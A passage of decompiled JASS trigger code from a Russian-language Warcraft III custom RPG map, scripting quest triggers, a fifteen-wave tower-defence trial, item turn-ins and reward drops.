function BVX takes nothing returns nothing
call IssuePointOrderLocBJ(GetEnumUnit(),"patrol",GetRectCenter(Dr))
endfunction
function BVY takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),Player(0))==true
endfunction
function BVZ takes nothing returns nothing
call IssuePointOrderLocBJ(GetEnumUnit(),"patrol",GetRectCenter(Dr))
endfunction
function BVa takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),Player(0))==true
endfunction
function BVb takes nothing returns nothing
call IssuePointOrderLocBJ(GetEnumUnit(),"patrol",GetRectCenter(Dr))
endfunction
function BVc takes nothing returns boolean
if not (IsUnitAliveBJ(Jn)==true) then
return false
endif
return true
endfunction
function BVd takes nothing returns boolean
if not (IsUnitAliveBJ(Jn)==true) then
return false
endif
return true
endfunction
function BVe takes nothing returns boolean
if not (IsUnitAliveBJ(Jn)==true) then
return false
endif
return true
endfunction
function BVf takes nothing returns boolean
if not (IsUnitAliveBJ(Jn)==true) then
return false
endif
return true
endfunction
function BVg takes nothing returns boolean
if not (IsUnitAliveBJ(Jn)==true) then
return false
endif
return true
endfunction
function BVh takes nothing returns boolean
if not (IsUnitAliveBJ(Jn)==true) then
return false
endif
return true
endfunction
function BVi takes nothing returns boolean
if not (IsUnitAliveBJ(Jn)==true) then
return false
endif
return true
endfunction
function BVj takes nothing returns boolean
if not (IsUnitAliveBJ(Jn)==true) then
return false
endif
return true
endfunction
function BVk takes nothing returns boolean
if not (IsUnitAliveBJ(Jn)==true) then
return false
endif
return true
endfunction
function BVl takes nothing returns boolean
if not (IsUnitAliveBJ(Jn)==true) then
return false
endif
return true
endfunction
function BVm takes nothing returns boolean
if not (IsUnitAliveBJ(Jn)==true) then
return false
endif
return true
endfunction
function BVn takes nothing returns boolean
if not (IsUnitAliveBJ(Jn)==true) then
return false
endif
return true
endfunction
function BVo takes nothing returns boolean
if not (IsUnitAliveBJ(Jn)==true) then
return false
endif
return true
endfunction
function BVp takes nothing returns boolean
if not (IsUnitAliveBJ(Jn)==true) then
return false
endif
return true
endfunction
function BVq takes nothing returns boolean
if not (IsUnitAliveBJ(Jn)==true) then
return false
endif
return true
endfunction
function BVr takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call SetUnitOwner(GetTriggerUnit(),Player(8),true)
call TriggerSleepAction(15.)
set V0=GetRectCenter(Ds)
call DisplayTextToForce(GetPlayersAll(),"Волна: |c00ff00ff1/15")
call CreateNUnitsAtLoc(5,$6E30354E,Player(10),V0,bj_UNIT_FACING)
call ForGroupBJ(GetUnitsInRectMatching(Ds,Condition(function BU7)),function BU8)
call RemoveLocation(V0)
call TriggerSleepAction(20.)
if BVq() then
set V0=GetRectCenter(Ds)
call DisplayTextToForce(GetPlayersAll(),"Волна: |c00ff00ff2/15")
call CreateNUnitsAtLoc(4,$6E30354F,Player(10),V0,bj_UNIT_FACING)
call ForGroupBJ(GetUnitsInRectMatching(Ds,Condition(function BU9)),function BVB)
call RemoveLocation(V0)
call TriggerSleepAction(20.)
if BVp() then
set V0=GetRectCenter(Ds)
call DisplayTextToForce(GetPlayersAll(),"Волна: |c00ff00ff3/15")
call CreateNUnitsAtLoc(4,$6E303550,Player(10),V0,bj_UNIT_FACING)
call ForGroupBJ(GetUnitsInRectMatching(Ds,Condition(function BVC)),function BVD)
call RemoveLocation(V0)
call TriggerSleepAction(20.)
if BVo() then
set V0=GetRectCenter(Ds)
call DisplayTextToForce(GetPlayersAll(),"Волна: |c00ff00ff4/15")
call CreateNUnitsAtLoc(4,$6E303735,Player(10),V0,bj_UNIT_FACING)
call ForGroupBJ(GetUnitsInRectMatching(Ds,Condition(function BVE)),function BVF)
call RemoveLocation(V0)
call TriggerSleepAction(20.)
if BVn() then
set V0=GetRectCenter(Ds)
call DisplayTextToForce(GetPlayersAll(),"Волна: |c00ff00ff5/15")
call CreateNUnitsAtLoc(4,$6E303733,Player(10),V0,bj_UNIT_FACING)
call ForGroupBJ(GetUnitsInRectMatching(Ds,Condition(function BVG)),function BVH)
call RemoveLocation(V0)
call TriggerSleepAction(20.)
if BVm() then
set V0=GetRectCenter(Ds)
call DisplayTextToForce(GetPlayersAll(),"Волна: |c00ff00ff6/15")
call CreateNUnitsAtLoc(4,$6E303732,Player(10),V0,bj_UNIT_FACING)
call ForGroupBJ(GetUnitsInRectMatching(Ds,Condition(function BVI)),function BVJ)
call RemoveLocation(V0)
call TriggerSleepAction(20.)
if BVl() then
set V0=GetRectCenter(Ds)
call DisplayTextToForce(GetPlayersAll(),"Волна: |c00ff00ff7/15")
call CreateNUnitsAtLoc(4,$6E303734,Player(10),V0,bj_UNIT_FACING)
call ForGroupBJ(GetUnitsInRectMatching(Ds,Condition(function BVK)),function BVL)
call RemoveLocation(V0)
call TriggerSleepAction(20.)
if BVk() then
set V0=GetRectCenter(Ds)
call DisplayTextToForce(GetPlayersAll(),"Волна: |c00ff00ff8/15")
call CreateNUnitsAtLoc(4,$6E303638,Player(10),V0,bj_UNIT_FACING)
call ForGroupBJ(GetUnitsInRectMatching(Ds,Condition(function BVM)),function BVN)
call RemoveLocation(V0)
call TriggerSleepAction(20.)
if BVj() then
set V0=GetRectCenter(Ds)
call DisplayTextToForce(GetPlayersAll(),"Волна: |c00ff00ff9/15")
call CreateNUnitsAtLoc(4,$6E303639,Player(10),V0,bj_UNIT_FACING)
call ForGroupBJ(GetUnitsInRectMatching(Ds,Condition(function BVO)),function BVP)
call RemoveLocation(V0)
call TriggerSleepAction(20.)
if BVi() then
set V0=GetRectCenter(Ds)
call DisplayTextToForce(GetPlayersAll(),"Волна: |c00ff00ff10/15")
call CreateNUnitsAtLoc(4,$6E303637,Player(10),V0,bj_UNIT_FACING)
call ForGroupBJ(GetUnitsInRectMatching(Ds,Condition(function BVQ)),function BVR)
call RemoveLocation(V0)
call TriggerSleepAction(20.)
if BVh() then
set V0=GetRectCenter(Ds)
call DisplayTextToForce(GetPlayersAll(),"Волна: |c00ff00ff11/15")
call CreateNUnitsAtLoc(8,$65303043,Player(10),V0,bj_UNIT_FACING)
call ForGroupBJ(GetUnitsInRectMatching(Ds,Condition(function BVS)),function BVT)
call RemoveLocation(V0)
call TriggerSleepAction(20.)
if BVg() then
set V0=GetRectCenter(Ds)
call DisplayTextToForce(GetPlayersAll(),"Волна: |c00ff00ff12/15")
call CreateNUnitsAtLoc(8,$65303058,Player(10),V0,bj_UNIT_FACING)
call ForGroupBJ(GetUnitsInRectMatching(Ds,Condition(function BVU)),function BVV)
call RemoveLocation(V0)
call TriggerSleepAction(20.)
if BVf() then
set V0=GetRectCenter(Ds)
call DisplayTextToForce(GetPlayersAll(),"Волна: |c00ff00ff13/15")
call CreateNUnitsAtLoc(10,$65303059,Player(10),V0,bj_UNIT_FACING)
call ForGroupBJ(GetUnitsInRectMatching(Ds,Condition(function BVW)),function BVX)
call RemoveLocation(V0)
call TriggerSleepAction(20.)
if BVe() then
set V0=GetRectCenter(Ds)
call DisplayTextToForce(GetPlayersAll(),"Волна: |c00ff00ff14/15")
call CreateNUnitsAtLoc(10,$6530305A,Player(10),V0,bj_UNIT_FACING)
call ForGroupBJ(GetUnitsInRectMatching(Ds,Condition(function BVY)),function BVZ)
call RemoveLocation(V0)
call TriggerSleepAction(20.)
if BVd() then
set V0=GetRectCenter(Ds)
call DisplayTextToForce(GetPlayersAll(),"Волна: |c00ff00ff15/15")
call CreateNUnitsAtLoc(3,$65303130,Player(10),V0,bj_UNIT_FACING)
call ForGroupBJ(GetUnitsInRectMatching(Ds,Condition(function BVa)),function BVb)
call RemoveLocation(V0)
call DisplayTextToForce(GetPlayersAll(),"Если в течении 120 секунд Башня погибнет, испытание провалено!")
call TriggerSleepAction(120.)
if BVc() then
call EnableTrigger(bg)
call DisableTrigger(bc)
call DisplayTextToForce(GetPlayersAll(),"Поздравляю Вас! Получите Вашу награду!")
call CreateItemLoc($49305433,GetRectCenter(Ds))
else
call DisplayTextToForce(GetPlayersAll(),"|c00ff0000Испытание Провалено!")
endif
else
call DisplayTextToForce(GetPlayersAll(),"|c00ff0000Испытание Провалено!")
endif
else
call DisplayTextToForce(GetPlayersAll(),"|c00ff0000Испытание Провалено!")
endif
else
call DisplayTextToForce(GetPlayersAll(),"|c00ff0000Испытание Провалено!")
endif
else
call DisplayTextToForce(GetPlayersAll(),"|c00ff0000Испытание Провалено!")
endif
else
call DisplayTextToForce(GetPlayersAll(),"|c00ff0000Испытание Провалено!")
endif
else
call DisplayTextToForce(GetPlayersAll(),"|c00ff0000Испытание Провалено!")
endif
else
call DisplayTextToForce(GetPlayersAll(),"|c00ff0000Испытание Провалено!")
endif
else
call DisplayTextToForce(GetPlayersAll(),"|c00ff0000Испытание Провалено!")
endif
else
call DisplayTextToForce(GetPlayersAll(),"|c00ff0000Испытание Провалено!")
endif
else
call DisplayTextToForce(GetPlayersAll(),"|c00ff0000Испытание Провалено!")
endif
else
call DisplayTextToForce(GetPlayersAll(),"|c00ff0000Испытание Провалено!")
endif
else
call DisplayTextToForce(GetPlayersAll(),"|c00ff0000Испытание Провалено!")
endif
else
call DisplayTextToForce(GetPlayersAll(),"|c00ff0000Испытание Провалено!")
endif
else
call DisplayTextToForce(GetPlayersAll(),"|c00ff0000Испытание Провалено!")
endif
endfunction
function BVs takes nothing returns nothing
set bf=CreateTrigger()
call TriggerRegisterUnitEvent(bf,Jn,EVENT_UNIT_SELECTED)
call TriggerAddAction(bf,function BVr)
endfunction
function BVt takes nothing returns boolean
if not (IsUnitType(GetTriggerUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
return true
endfunction
function BVu takes nothing returns nothing
call SetUnitPositionLoc(GetTriggerUnit(),GetRectCenter(D1))
endfunction
function BVv takes nothing returns nothing
set be=CreateTrigger()
call DisableTrigger(be)
call TriggerRegisterEnterRectSimple(be,Dv)
call TriggerAddCondition(be,Condition(function BVt))
call TriggerAddAction(be,function BVu)
endfunction
function BVw takes nothing returns boolean
if not (IsUnitType(GetTriggerUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
return true
endfunction
function BVx takes nothing returns nothing
call SetUnitPositionLoc(GetTriggerUnit(),GetRectCenter(Fp))
endfunction
function BVy takes nothing returns nothing
set bg=CreateTrigger()
call DisableTrigger(bg)
call TriggerRegisterEnterRectSimple(bg,Dq)
call TriggerAddCondition(bg,Condition(function BVw))
call TriggerAddAction(bg,function BVx)
endfunction
function BVz takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$6E746B77) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=300.) then
return false
endif
return true
endfunction
function BV0 takes nothing returns boolean
if not (GetUnitLevel(GetTriggerUnit())>=50) then
return false
endif
return true
endfunction
function BV1 takes nothing returns nothing
if BV0() then
call DisableTrigger(GetTriggeringTrigger())
call EnableTrigger(bi)
call DestroyEffectBJ(Us[42])
call AddSpecialEffectTargetUnitBJ("overhead",Jo,"war3mapImported\\QuestYellow1_Portrait.mdx")
set Us[42]=GetLastCreatedEffectBJ()
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_DISCOVERED,"|cffffcc00Задание получено:|r \"Всё ближе к усилению\".")
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c006969FFУровень задания: 50+|r
")
call CreateQuestBJ(bj_QUESTTYPE_OPT_DISCOVERED,"Всё ближе к усилению","У Вас есть Личное оружие 7 Уровня, и желание его улучшить? Что ж, принесите мне Эссенцию Луны, и я дам Вам такую возможность.
|c006969FFУровень задания: 50+|r","ReplaceableTextures\\CommandButtons\\BTNAmbush.blp")
set YX[42]=GetLastCreatedQuestBJ()
call SetUnitOwner(GetOrderTargetUnit(),Player(8),true)
else
call ne(GetTriggerUnit(),"Задание с |c00ff000050|r уровня",.027,255,255,255)
endif
endfunction
function BV2 takes nothing returns nothing
set bh=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(bh,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(bh,Condition(function BVz))
call TriggerAddAction(bh,function BV1)
endfunction
function BV3 takes nothing returns boolean
if not (UnitHasItemOfTypeBJ(GetTriggerUnit(),$49304A54)==true) then
return false
endif
return true
endfunction
function BV4 takes nothing returns nothing
call DestroyEffectBJ(Us[42])
call QuestSetCompletedBJ(YX[42],true)
call DestroyQuest(YX[42])
call DisableTrigger(GetTriggeringTrigger())
call AddSpecialEffectLocBJ(GetRectCenter(Gr),"Abilities\\Spells\\Human\\MassTeleport\\MassTeleportTo.mdl")
call EnableTrigger(bj)
endfunction
function BV5 takes nothing returns nothing
set bi=CreateTrigger()
call DisableTrigger(bi)
call TriggerRegisterEnterRectSimple(bi,Gr)
call TriggerAddCondition(bi,Condition(function BV3))
call TriggerAddAction(bi,function BV4)
endfunction
function BV6 takes nothing returns boolean
if not (IsUnitType(GetTriggerUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
if not (GetUnitLevel(GetTriggerUnit())>=50) then
return false
endif
return true
endfunction
function BV7 takes nothing returns nothing
call RemoveUnit(GetEnumUnit())
endfunction
function BV8 takes nothing returns nothing
call RemoveUnit(GetEnumUnit())
endfunction
function BV9 takes nothing returns nothing
set S4=0
set V0=GetRectCenter(D7)
call SetUnitPositionLoc(GetTriggerUnit(),V0)
call SetUnitPositionLocFacingBJ(L5,V0,270.)
call SetUnitOwner(L5,Player(PLAYER_NEUTRAL_PASSIVE),true)
call SetUnitLifePercentBJ(L5,100)
call SetUnitLifePercentBJ(GetEnteringUnit(),100)
call SetUnitManaPercentBJ(GetEnteringUnit(),100)
call RemoveLocation(V0)
set SR=GetUnitsOfTypeIdAll($75303056)
call ForGroupBJ(SR,function BV7)
call DestroyGroup(SR)
set SR=GetUnitsOfTypeIdAll($75303057)
call ForGroupBJ(SR,function BV8)
call DestroyGroup(SR)
endfunction
function BWB takes nothing returns nothing
set bj=CreateTrigger()
call DisableTrigger(bj)
call TriggerRegisterEnterRectSimple(bj,Gr)
call TriggerAddCondition(bj,Condition(function BV6))
call TriggerAddAction(bj,function BV9)
endfunction
function BWC takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$6E6D7972) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=300.) then
return false
endif
return true
endfunction
function BWD takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call DestroyEffectBJ(Us[43])
call AddSpecialEffectTargetUnitBJ("overhead",Ix,"war3mapImported\\QuestYellow1_Portrait.mdx")
set Us[43]=GetLastCreatedEffectBJ()
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_DISCOVERED,"|cffffcc00Задание получено:|r \"Выбор за вами\".")
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c006969FFУровень задания: Не указан|r
")
call CreateQuestBJ(bj_QUESTTYPE_OPT_DISCOVERED,"Выбор за вами","В мире существует множество артефактов, которые таят в себе огромную силу. Но я более чем уверен, что у Вас не хватит сил добыть их все. Поэтому принесите мне любой из этих артефактов, и получите награду.
|c00ff0000Клык|r - его вы можете отобрать у четвероногого воришки;
|c00ffff00Кольцо Судьбы|r - это преобразование уже готового ювелирного изделия;
|c00ff0000Луч Солнца|r - зарядите источник Света душами умерших врагов, и с шансом вы можете получить данный предмет.
|c006969FFУровень задания: Не указан","ReplaceableTextures\\CommandButtons\\BTNAmbush.blp")
set YX[43]=GetLastCreatedQuestBJ()
call SetUnitOwner(GetOrderTargetUnit(),Player(8),true)
endfunction
function BWE takes nothing returns nothing
set bk=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(bk,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(bk,Condition(function BWC))
call TriggerAddAction(bk,function BWD)
endfunction
function BWF takes nothing returns boolean
if not (UnitHasItem(GetEnteringUnit(),GetItemOfTypeFromUnitBJ(GetEnteringUnit(),$49304B57))==true) then
return false
endif
return true
endfunction
function BWG takes nothing returns nothing
call RemoveItem(GetItemOfTypeFromUnitBJ(GetEnteringUnit(),$49304B57))
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"Всё, мне больше ничего не надо! Получите свою награду и уходите.")
call CreateItemLoc($49304A31,GetRectCenter(EG))
call CreateItemLoc($49304C31,GetRectCenter(EG))
call DestroyEffectBJ(Us[43])
call DestroyQuest(YX[43])
endfunction
function BWH takes nothing returns nothing
set bl=CreateTrigger()
call TriggerRegisterEnterRectSimple(bl,EG)
call TriggerAddCondition(bl,Condition(function BWF))
call TriggerAddAction(bl,function BWG)
endfunction
function BWI takes nothing returns boolean
if not (UnitHasItem(GetEnteringUnit(),GetItemOfTypeFromUnitBJ(GetEnteringUnit(),$49304B58))==true) then
return false
endif
return true
endfunction
function BWJ takes nothing returns nothing
call RemoveItem(GetItemOfTypeFromUnitBJ(GetEnteringUnit(),$49304B58))
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"Всё, мне больше ничего не надо! Получите свою награду и уходите.")
call CreateItemLoc($49304A31,GetRectCenter(EG))
call CreateItemLoc($49304B5A,GetRectCenter(EG))
call DestroyEffectBJ(Us[43])
call DestroyQuest(YX[43])
endfunction
function BWK takes nothing returns nothing
set bm=CreateTrigger()
call TriggerRegisterEnterRectSimple(bm,EG)
call TriggerAddCondition(bm,Condition(function BWI))
call TriggerAddAction(bm,function BWJ)
endfunction
function BWL takes nothing returns boolean
if not (UnitHasItem(GetEnteringUnit(),GetItemOfTypeFromUnitBJ(GetEnteringUnit(),$49304B59))==true) then
return false
endif
return true
endfunction
function BWM takes nothing returns nothing
call RemoveItem(GetItemOfTypeFromUnitBJ(GetEnteringUnit(),$49304B59))
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"Всё, мне больше ничего не надо! Получите свою награду и уходите.")
call CreateItemLoc($49304A31,GetRectCenter(EG))
call CreateItemLoc($49304C30,GetRectCenter(EG))
call DestroyEffectBJ(Us[43])
call DestroyQuest(YX[43])
endfunction
function BWN takes nothing returns nothing
set bn=CreateTrigger()
call TriggerRegisterEnterRectSimple(bn,EG)
call TriggerAddCondition(bn,Condition(function BWL))
call TriggerAddAction(bn,function BWM)
endfunction
function BWO takes nothing returns boolean
if not (UnitHasItem(GetEnteringUnit(),GetItemOfTypeFromUnitBJ(GetEnteringUnit(),$49303935))==true) then
return false
endif
return true
endfunction
function BWP takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call RemoveItem(GetItemOfTypeFromUnitBJ(GetEnteringUnit(),$49303935))
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"Хм... Что Вам надо? Окунуть эту жалкую вещь в колодец магии? Ну хорошо, смотрите, что из этого получилось..
")
call UnitAddItemByIdSwapped($49304B58,GetTriggerUnit())
endfunction
function BWQ takes nothing returns nothing
set bo=CreateTrigger()
call TriggerRegisterEnterRectSimple(bo,Ff)
call TriggerAddCondition(bo,Condition(function BWO))
call TriggerAddAction(bo,function BWP)
endfunction
function BWR takes nothing returns boolean
if not (GetOwningPlayer(GetTriggerUnit())==Player(PLAYER_NEUTRAL_AGGRESSIVE)) then
return false
endif
if not (RectContainsUnit(EH,GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function BWS takes nothing returns boolean
if not (GetRandomInt(1,15)==1) then
return false
endif
return true
endfunction
function BWT takes nothing returns nothing
if BWS() then
call DisableTrigger(GetTriggeringTrigger())
call CreateItemLoc($49304B59,GetUnitLoc(GetTriggerUnit()))
call PlaySoundOnUnitBJ(C,100,GetTriggerUnit())
call CreateTextTagUnitBJ("Удача! Вам выпал |c00ffff00\"Луч Солнца\"",GetTriggerUnit(),0,15.,100.,100.,100.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
else
endif
endfunction
function BWU takes nothing returns nothing
set bp=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(bp,EVENT_PLAYER_UNIT_DEATH)
call TriggerAddCondition(bp,Condition(function BWR))
call TriggerAddAction(bp,function BWT)
endfunction
function BWV takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$75303058) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=300.) then
return false
endif
return true
endfunction
function BWW takes nothing returns boolean
if not (GetUnitLevel(GetTriggerUnit())>=50) then
return false
endif
return true
endfunction
function BWX takes nothing returns nothing
if BWW() then
call DisableTrigger(GetTriggeringTrigger())
call EnableTrigger(br)
call DestroyEffectBJ(Us[44])
call AddSpecialEffectTargetUnitBJ("overhead",I5,"war3mapImported\\QuestYellow1_Portrait.mdx")
set Us[44]=GetLastCreatedEffectBJ()
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_DISCOVERED,"|cffffcc00Задание получено:|r \"Несколько ингредиентов\".")
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c006969FFУровень задания: 50+|r
")
call CreateQuestBJ(bj_QUESTTYPE_OPT_DISCOVERED,"Несколько ингредиентов","Здраствуйте, голубчики, не поможете мне в поиске ингредиентов для создания некого снадобья? Мне нужно всего-то мелочи... Коготки, Паутина, Талисман Капитана, Полная колба, Немного кожи","ReplaceableTextures\\CommandButtons\\BTNAmbush.blp")
set YX[44]=GetLastCreatedQuestBJ()
call SetUnitOwner(GetOrderTargetUnit(),Player(8),true)
else
call ne(GetTriggerUnit(),"Задание с |c00ff000050|r уровня",.027,255,255,255)
endif
endfunction
function BWY takes nothing returns nothing
set bq=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(bq,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(bq,Condition(function BWV))
call TriggerAddAction(bq,function BWX)
endfunction
function BWZ takes nothing returns boolean
if not (GetTriggerUnit()==LP) then
return false
endif
return true
endfunction
function BWa takes nothing returns nothing
call SetUnitPositionLoc(GetTriggerUnit(),GetRectCenter(GU))
call SetUnitLifePercentBJ(GetTriggerUnit(),100)
endfunction
function BWb takes nothing returns nothing
set bs=CreateTrigger()
call TriggerRegisterLeaveRectSimple(bs,FE)
call TriggerAddCondition(bs,Condition(function BWZ))
call TriggerAddAction(bs,function BWa)
endfunction
function BWc takes nothing returns boolean
if not (UnitHasItem(GetEnteringUnit(),GetItemOfTypeFromUnitBJ(GetEnteringUnit(),$6473756D))==true) then
return false
endif
if not (UnitHasItem(GetEnteringUnit(),GetItemOfTypeFromUnitBJ(GetEnteringUnit(),$77696C6C))==true) then
return false
endif
if not (UnitHasItem(GetEnteringUnit(),GetItemOfTypeFromUnitBJ(GetEnteringUnit(),$49303059))==true) then
return false
endif
if not (UnitHasItem(GetEnteringUnit(),GetItemOfTypeFromUnitBJ(GetEnteringUnit(),$49304143))==true) then
return false
endif
if not (UnitHasItem(GetEnteringUnit(),GetItemOfTypeFromUnitBJ(GetEnteringUnit(),$49303130))==true) then
return false
endif
return true
endfunction
function BWd takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call DestroyQuest(YX[44])
call RemoveItem(GetItemOfTypeFromUnitBJ(GetEnteringUnit(),$6473756D))
call RemoveItem(GetItemOfTypeFromUnitBJ(GetEnteringUnit(),$77696C6C))
call RemoveItem(GetItemOfTypeFromUnitBJ(GetEnteringUnit(),$49303059))
call RemoveItem(GetItemOfTypeFromUnitBJ(GetEnteringUnit(),$49303130))
call RemoveItem(GetItemOfTypeFromUnitBJ(GetEnteringUnit(),$49304143))
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"ХАХАХ, как Вы думаете, зачем я варил зелье?? Одолеете моего питомца?? Попробуйте!")
call TriggerSleepAction(10.)
call ShowUnitShow(LP)
call SetUnitInvulnerable(LP,false)
endfunction
function BWe takes nothing returns nothing
set br=CreateTrigger()
call DisableTrigger(br)
call TriggerRegisterEnterRectSimple(br,GU)
call TriggerAddCondition(br,Condition(function BWc))
call TriggerAddAction(br,function BWd)
endfunction
function BWf takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$6E303636) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=200.) then
return false
endif
return true
endfunction
function BWg takes nothing returns nothing
call IssuePointOrderLoc(GetEnumUnit(),"patrol",GetRectCenter(Eb))
endfunction
function BWh takes nothing returns nothing
call IssuePointOrderLoc(GetEnumUnit(),"patrol",GetRectCenter(Eb))
endfunction
function BWi takes nothing returns nothing
call IssuePointOrderLoc(GetEnumUnit(),"patrol",GetRectCenter(Eb))
endfunction
function BWj takes nothing returns nothing
call IssuePointOrderLoc(GetEnumUnit(),"patrol",GetRectCenter(Eb))
endfunction
function BWk takes nothing returns nothing
call IssuePointOrderLoc(GetEnumUnit(),"patrol",GetRectCenter(Eb))
endfunction
function BWl takes nothing returns nothing
call IssuePointOrderLoc(GetEnumUnit(),"patrol",GetRectCenter(Eb))
endfunction
function BWm takes nothing returns nothing
call IssuePointOrderLoc(GetEnumUnit(),"patrol",GetRectCenter(Eb))
endfunction
function BWn takes nothing returns nothing
call IssuePointOrderLoc(GetEnumUnit(),"patrol",GetRectCenter(Eb))
endfunction
function BWo takes nothing returns boolean
if not (GetUnitLevel(MT[GetForLoopIndexB()-1])>=51) then
return false
endif
return true
endfunction
function BWp takes nothing returns boolean
if not (IsUnitAliveBJ(JW)==true) then
return false
endif
return true
endfunction
function BWq takes nothing returns boolean
if not (IsUnitAliveBJ(JW)==true) then
return false
endif
return true
endfunction
function BWr takes nothing returns boolean
if not (IsUnitAliveBJ(JW)==true) then
return false
endif
return true
endfunction
function BWs takes nothing returns boolean
if not (IsUnitAliveBJ(JW)==true) then
return false
endif
return true
endfunction
function BWt takes nothing returns boolean
if not (IsUnitAliveBJ(JW)==true) then
return false
endif
return true
endfunction
function BWu takes nothing returns boolean
if not (IsUnitAliveBJ(JW)==true) then
return false
endif
return true
endfunction
function BWv takes nothing returns boolean
if not (IsUnitAliveBJ(JW)==true) then
return false
endif
return true
endfunction
function BWw takes nothing returns boolean
if not (IsUnitAliveBJ(JW)==true) then
return false
endif
return true
endfunction
function BWx takes nothing returns boolean
if not (GetUnitLevel(GetTriggerUnit())>=51) then
return false
endif
return true
endfunction
function BWy takes nothing returns nothing
if BWx() then
call DisableTrigger(GetTriggeringTrigger())
call DestroyEffectBJ(Us[45])
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_DISCOVERED,"|cffffcc00Задание получено:|r \"Натиск Демонов\".")
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c006969FFУровень задания: 51+|r
Демоны!!! Они повсюду!! ААААА!!! Помогите, иначе я умру!")
call SetUnitOwner(GetOrderTargetUnit(),Player(8),true)
call TriggerSleepAction(10.)
set Vz=GetRectCenter(Ec)
call CreateNUnitsAtLoc(10,$6E30344D,Player(10),Vz,bj_UNIT_FACING)
call RemoveLocation(Vz)
set SR=GetUnitsInRectOfPlayer(Ec,Player(10))
call ForGroupBJ(SR,function BWg)
call DestroyGroup(SR)
call TriggerSleepAction(15.)
if BWw() then
set Vz=GetRectCenter(Ec)
call CreateNUnitsAtLoc(10,$6E30344D,Player(10),Vz,bj_UNIT_FACING)
call RemoveLocation(Vz)
set SR=GetUnitsInRectOfPlayer(Ec,Player(10))
call ForGroupBJ(SR,function BWh)
call DestroyGroup(SR)
call TriggerSleepAction(15.)
if BWv() then
set Vz=GetRectCenter(Ec)
call CreateNUnitsAtLoc(10,$6E30344D,Player(10),Vz,bj_UNIT_FACING)
call RemoveLocation(Vz)
set SR=GetUnitsInRectOfPlayer(Ec,Player(10))
call ForGroupBJ(SR,function BWi)
call DestroyGroup(SR)
call TriggerSleepAction(15.)
if BWu() then
set Vz=GetRectCenter(Ec)
call CreateNUnitsAtLoc(3,$6E303454,Player(10),Vz,bj_UNIT_FACING)
call RemoveLocation(Vz)
set SR=GetUnitsInRectOfPlayer(Ec,Player(10))
call ForGroupBJ(SR,function BWj)
call DestroyGroup(SR)
call TriggerSleepAction(15.)
if BWt() then
set Vz=GetRectCenter(Ec)
call CreateNUnitsAtLoc(5,$6E303454,Player(10),Vz,bj_UNIT_FACING)
call RemoveLocation(Vz)
set SR=GetUnitsInRectOfPlayer(Ec,Player(10))
call ForGroupBJ(SR,function BWk)
call DestroyGroup(SR)
call TriggerSleepAction(15.)
if BWs() then
set Vz=GetRectCenter(Ec)
call CreateNUnitsAtLoc(3,$6E303644,Player(10),Vz,bj_UNIT_FACING)
call RemoveLocation(Vz)
set SR=GetUnitsInRectOfPlayer(Ec,Player(10))
call ForGroupBJ(SR,function BWl)
call DestroyGroup(SR)
call TriggerSleepAction(15.)
if BWr() then
set Vz=GetRectCenter(Ec)
call CreateNUnitsAtLoc(5,$6E303644,Player(10),Vz,bj_UNIT_FACING)
call RemoveLocation(Vz)
set SR=GetUnitsInRectOfPlayer(Ec,Player(10))
call ForGroupBJ(SR,function BWm)
call DestroyGroup(SR)
call TriggerSleepAction(15.)
if BWq() then
set Vz=GetRectCenter(Ec)
call CreateNUnitsAtLoc(8,$6E303644,Player(10),Vz,bj_UNIT_FACING)
call RemoveLocation(Vz)
set SR=GetUnitsInRectOfPlayer(Ec,Player(10))
call ForGroupBJ(SR,function BWn)
